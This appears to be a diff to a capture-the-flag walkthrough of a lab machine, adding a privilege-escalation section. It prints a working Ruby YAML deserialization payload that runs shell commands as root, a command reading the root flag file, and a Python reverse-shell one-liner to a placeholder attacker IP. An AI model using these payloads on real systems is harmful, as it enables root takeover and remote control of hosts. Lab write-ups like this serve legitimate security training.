@@ -183,7 +183,7 @@ Check if there is any vulnerability that relates to it.
 
 ![image](https://cdn-images-1.medium.com/max/1000/1*PKlhHA73_RXcs9J3OFL_hQ.png)
 
-there is. But it's not the same version of pdfkit.
+There is. But it's not the same version of pdfkit.
 
 Ill pull it althought I know it's not the version, but maybe Ill find out that is ok:
 
@@ -284,6 +284,98 @@ enter the password
 and we are in as henry.
 
 ![image](https://cdn-images-1.medium.com/max/1000/1*MtOF9RFZTXrJ3GWunIchoA.png)
+
+check which files henry can run as root with:
+
+```bash
+sudo -l
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+After cat the file I saw it needs dependencies to execute.
+
+![image](https://cdn-images-1.medium.com/max/1000/1*X2VI9OMxHQnCs05ZCoPejQ.png)
+
+
+after trying to run the file I got an error. I decided to read more about aribtrary code execution vulnerability on yaml ruby. 
+
+
+https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565?ref=blog.stratumsecurity.com#file-ruby_yaml_load_sploit2-yaml
+
+
+There is explanation how to exploit ruby file desirialization.
+So, take the payload and name it as the same as "dependencies.yml"
+on another directory:
+
+```bash
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: "bash -c 'ping <ip-address>'"
+         method_id: :resolve
+
+```
+
+on git_Set : enter the command you want to try.
+
+then, run 'sudo /usr/bin/ruby /opt/update_dependencies.rb' 
+within the directory that include the new yaml 
+dependency file that has been created.
+
+that's what i set:
+
+```
+git_set: "bash -c 'ping <ip-address>'"
+```
+
+after running the .rb file, the ping command worked.
+
+![image](https://cdn-images-1.medium.com/max/1000/1*8VNAnSBAcHC7DTaD8ZbzmA.png)
+
+which means that the payload works.
+
+I changed the git_set to read the root.txt inside root directory.
+
+```
+git_set: cat /root/root.txt
+```
+
+and root.txt has been obtained.
+
+If you want to get full access as root within the machine,
+just change the git_set to run python reverse shell code.
+set a netcat listener on your machine, then run the update file again 
+to get a reverse shell as root.
+
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<tun-ip",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+
+and there is a shell as root!
+
+![image](https://cdn-images-1.medium.com/max/1000/1*9f0q6ovf40ejfQlZO8jrYQ.png)
+
+That's it.
+
+***Written by Alon Presman, Penetration Tester and Ethical Hacker.***
+
+
 
 
 
